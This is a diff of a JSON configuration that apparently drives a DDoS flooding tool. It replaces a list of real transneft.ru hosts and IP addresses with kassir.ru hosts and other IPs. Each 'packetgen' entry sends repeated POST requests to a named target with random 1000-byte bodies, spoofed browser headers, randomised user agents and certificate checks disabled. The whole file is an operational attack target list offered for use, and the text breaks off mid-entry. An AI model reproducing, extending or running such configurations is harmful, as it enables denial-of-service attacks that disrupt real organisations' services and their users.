-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://gw-ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "gw-ak.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://gw-ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://gw-ak.transneft.ru",
-                                "Referer": "http://gw-ak.transneft.ru",
-                                "X-Forwarded-Host": "gw-ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.156:110",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.156:110"
+                        "address": "94.140.213.21:993"
                     }
                 },
                 "packet": {
@@ -1103,14 +115,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://vpn.transneft.ru",
+            "count": 11,
+            "name": "https://hm.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "vpn.transneft.ru:443",
+                        "address": "hm.kassir.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1121,7 +133,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://vpn.transneft.ru",
+                            "path": "https://hm.kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1134,9 +146,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn.transneft.ru",
-                                "Referer": "https://vpn.transneft.ru",
-                                "X-Forwarded-Host": "vpn.transneft.ru",
+                                "Origin": "https://hm.kassir.ru",
+                                "Referer": "https://hm.kassir.ru",
+                                "X-Forwarded-Host": "hm.kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1147,14 +159,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://uc.transneft.ru",
+            "count": 11,
+            "name": "http://hm.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "uc.transneft.ru:80"
+                        "address": "hm.kassir.ru:80"
                     }
                 },
                 "packet": {
@@ -1162,7 +174,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://uc.transneft.ru",
+                            "path": "http://hm.kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1175,9 +187,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://uc.transneft.ru",
-                                "Referer": "http://uc.transneft.ru",
-                                "X-Forwarded-Host": "uc.transneft.ru",
+                                "Origin": "http://hm.kassir.ru",
+                                "Referer": "http://hm.kassir.ru",
+                                "X-Forwarded-Host": "hm.kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1188,17 +200,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://vpn03.transneft.ru",
+            "count": 11,
+            "name": "http://report.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "vpn03.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "report.kassir.ru:80"
                     }
                 },
                 "packet": {
@@ -1206,7 +215,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://vpn03.transneft.ru",
+                            "path": "http://report.kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1219,9 +228,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn03.transneft.ru",
-                                "Referer": "https://vpn03.transneft.ru",
-                                "X-Forwarded-Host": "vpn03.transneft.ru",
+                                "Origin": "http://report.kassir.ru",
+                                "Referer": "http://report.kassir.ru",
+                                "X-Forwarded-Host": "report.kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1232,58 +241,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.207",
+            "count": 11,
+            "name": "tcp://94.140.212.97:88",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.207:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.207",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.207",
-                                "Referer": "https://212.73.103.207",
-                                "X-Forwarded-Host": "212.73.103.207",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.156:995",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.156:995"
+                        "address": "94.140.212.97:88"
                     }
                 },
                 "packet": {
@@ -1298,55 +263,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://gw-ak2.transneft.ru",
+            "count": 11,
+            "name": "https://94.140.212.89",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "gw-ak2.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://gw-ak2.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://gw-ak2.transneft.ru",
-                                "Referer": "http://gw-ak2.transneft.ru",
-                                "X-Forwarded-Host": "gw-ak2.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://web.vsmn.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "web.vsmn.transneft.ru:443",
+                        "address": "94.140.212.89:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1357,7 +281,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://web.vsmn.transneft.ru",
+                            "path": "https://94.140.212.89",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1370,9 +294,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://web.vsmn.transneft.ru",
-                                "Referer": "https://web.vsmn.transneft.ru",
-                                "X-Forwarded-Host": "web.vsmn.transneft.ru",
+                                "Origin": "https://94.140.212.89",
+                                "Referer": "https://94.140.212.89",
+                                "X-Forwarded-Host": "94.140.212.89",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1383,14 +307,55 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.189",
+            "count": 11,
+            "name": "http://cdn.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.189:443",
+                        "address": "cdn.kassir.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://cdn.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://cdn.kassir.ru",
+                                "Referer": "http://cdn.kassir.ru",
+                                "X-Forwarded-Host": "cdn.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://imap.kassirdev.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "imap.kassirdev.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1401,7 +366,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://212.73.103.189",
+                            "path": "https://imap.kassirdev.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1414,9 +379,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.189",
-                                "Referer": "https://212.73.103.189",
-                                "X-Forwarded-Host": "212.73.103.189",
+                                "Origin": "https://imap.kassirdev.ru",
+                                "Referer": "https://imap.kassirdev.ru",
+                                "X-Forwarded-Host": "imap.kassirdev.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1427,14 +392,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.203",
+            "count": 11,
+            "name": "https://94.140.212.88",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.203:443",
+                        "address": "94.140.212.88:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1445,7 +410,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://212.73.103.203",
+                            "path": "https://94.140.212.88",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1458,9 +423,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.203",
-                                "Referer": "https://212.73.103.203",
-                                "X-Forwarded-Host": "212.73.103.203",
+                                "Origin": "https://94.140.212.88",
+                                "Referer": "https://94.140.212.88",
+                                "X-Forwarded-Host": "94.140.212.88",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1471,404 +436,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.134",
+            "count": 11,
+            "name": "tcp://94.140.212.26:143",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.134:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://212.73.103.134",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.134",
-                                "Referer": "http://212.73.103.134",
-                                "X-Forwarded-Host": "212.73.103.134",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://aksmr-test.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "aksmr-test.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://aksmr-test.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://aksmr-test.transneft.ru",
-                                "Referer": "https://aksmr-test.transneft.ru",
-                                "X-Forwarded-Host": "aksmr-test.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://av.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "av.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://av.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://av.transneft.ru",
-                                "Referer": "https://av.transneft.ru",
-                                "X-Forwarded-Host": "av.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.176",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.176:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.176",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.176",
-                                "Referer": "https://212.73.103.176",
-                                "X-Forwarded-Host": "212.73.103.176",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://www.nvr.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "www.nvr.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://www.nvr.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.nvr.transneft.ru",
-                                "Referer": "https://www.nvr.transneft.ru",
-                                "X-Forwarded-Host": "www.nvr.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://portal.cp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "portal.cp.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://portal.cp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://portal.cp.transneft.ru",
-                                "Referer": "http://portal.cp.transneft.ru",
-                                "X-Forwarded-Host": "portal.cp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.93",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.93:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.93",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.93",
-                                "Referer": "https://212.73.103.93",
-                                "X-Forwarded-Host": "212.73.103.93",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://ftp.mb.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ftp.mb.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ftp.mb.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ftp.mb.transneft.ru",
-                                "Referer": "https://ftp.mb.transneft.ru",
-                                "X-Forwarded-Host": "ftp.mb.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://av.ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "av.ak.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://av.ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://av.ak.transneft.ru",
-                                "Referer": "https://av.ak.transneft.ru",
-                                "X-Forwarded-Host": "av.ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.163:21",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.163:21"
+                        "address": "94.140.212.26:143"
                     }
                 },
                 "packet": {
@@ -1883,14 +458,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.105",
+            "count": 11,
+            "name": "https://smtp.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.105:443",
+                        "address": "smtp.kassir.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1901,7 +476,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://212.73.103.105",
+                            "path": "https://smtp.kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1914,9 +489,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.105",
-                                "Referer": "https://212.73.103.105",
-                                "X-Forwarded-Host": "212.73.103.105",
+                                "Origin": "https://smtp.kassir.ru",
+                                "Referer": "https://smtp.kassir.ru",
+                                "X-Forwarded-Host": "smtp.kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1927,14 +502,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://_autodiscover._tcp.transneft.ru",
+            "count": 11,
+            "name": "http://94.140.212.97",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "_autodiscover._tcp.transneft.ru:80"
+                        "address": "94.140.212.97:80"
                     }
                 },
                 "packet": {
@@ -1942,7 +517,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://_autodiscover._tcp.transneft.ru",
+                            "path": "http://94.140.212.97",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1955,9 +530,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://_autodiscover._tcp.transneft.ru",
-                                "Referer": "http://_autodiscover._tcp.transneft.ru",
-                                "X-Forwarded-Host": "_autodiscover._tcp.transneft.ru",
+                                "Origin": "http://94.140.212.97",
+                                "Referer": "http://94.140.212.97",
+                                "X-Forwarded-Host": "94.140.212.97",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1968,14 +543,184 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.97.104:444",
+            "count": 11,
+            "name": "http://report-crocus.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.97.104:444"
+                        "address": "report-crocus.kassir.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://report-crocus.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://report-crocus.kassir.ru",
+                                "Referer": "http://report-crocus.kassir.ru",
+                                "X-Forwarded-Host": "report-crocus.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://94.140.212.95",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.95:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://94.140.212.95",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://94.140.212.95",
+                                "Referer": "https://94.140.212.95",
+                                "X-Forwarded-Host": "94.140.212.95",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://api.kassir.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "api.kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://api.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
